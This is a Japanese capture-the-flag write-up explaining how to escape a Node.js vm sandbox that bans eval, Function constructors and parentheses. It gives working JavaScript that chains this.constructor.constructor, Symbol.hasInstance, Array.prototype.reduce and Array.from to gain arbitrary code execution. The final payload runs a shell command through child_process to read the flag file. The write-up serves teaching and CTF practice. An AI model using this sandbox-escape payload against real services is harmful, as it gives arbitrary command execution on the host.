# Functionless Writeup (ja)

## 作者

@n4o847

## 問題概要

- 入力されたコードが Node.js の [vm](https://nodejs.org/api/vm.html) モジュールで実行される
- `eval` の呼び出しや関数コンストラクタ (`Function` など) が禁止されている
- 入力には `(`, `)`, <code>`</code> のいずれの文字も含まれてはいけない

## 脆弱性

まず、`this` はコンテキスト外で作られたオブジェクトを参照していることから、`this.constructor.constructor` とすることで VM 外の `Function` コンストラクタを得られることが知られています。

この VM 外の `Function` の使用は `codeGeneration: { strings: false }` の制約によって禁止されていない上に、外のグローバルオブジェクトにアクセスできます。

```js
this.constructor.constructor("console.log(process)")()
```

次に、検索すると、括弧やバッククオートを使わない関数呼び出しで Node.js でも使えるものとして以下が出てきます。

```js
x instanceof {[Symbol.hasInstance]: f}
```

これは

```js
!!f.call({}, x)

// or simply
!!f(x)
```

と等価になります。
ここで、

- 関数 `f` の引数が 1 つしか与えられないこと
- その結果が論理値としてしか取得できないこと

が問題となります。

これと `Function` コンストラクタを組み合わせてうまく任意コード実行をしたいですが、`Function(code)()` のように 2 回連続で呼び出す必要があり難しいです。

関数を呼び出した結果を再び得る方法として、`Array.prototype.reduce` を使った以下の方法を考えます。

```js
a = [x, y, z]
a[Symbol.hasInstance] = Array.prototype.reduce
f instanceof a
```

これは

```js
a = [x, y, z]
!!a.reduce(f)
```

と等価になり、展開すると

```js
a = [x, y, z]
f(f(x, y, 1, a), z, 2, a)
```

と等価になります。

`f` が引数のどちらかをどちらかに適用するような関数だと良いです。

`f = Array.from` としてみると

```js
a = [x, y, z]
!!Array.from(Array.from(x, y, 1, a), z, 2, a)
```

となり、`x` が配列であれば

```js
!!x.map(y, 1).map(z, 2)
```

と等価になります。
さらに、`x` が要素 1 つの配列であれば

```js
!!z.call(2, y.call(1, x[0], 0), 1)

// or simply
!!z(y(x[0], 0), 1)
```

と等価になります。

`y = Function` とすれば `y(x[0], 0)` の結果が `z` に渡されますが、余計な 2 番目の引数 `0` が関数の本体として渡されています。

ですが、デフォルト引数を使えば `Function` の引数部分にも任意の式を書くことができます。

```js
f = Function("x = console.log(42)", "0")
f()  // output: 42
```

よって

```js
a = [["x = <code>"], this.constructor.constructor, _ => f = _]
a[Symbol.hasInstance] = Array.prototype.reduce
Array.from instanceof a
```

とすれば任意コードを実行する関数 `f` が得られ、デフォルト引数が評価されるように呼び出せば

```js
+{ valueOf: f }
```

で任意コードが実行できます。

## 解法

```js
c = "process.stdout.write\x28process.mainModule.require\x28'child_process'\x29.execSync\x28'cat flag-*.txt'\x29\x29"
a = [["x = " + c], this.constructor.constructor, _ => f = _]
a[Symbol.hasInstance] = Array.prototype.reduce
Array.from instanceof a
+{ valueOf: f }
```
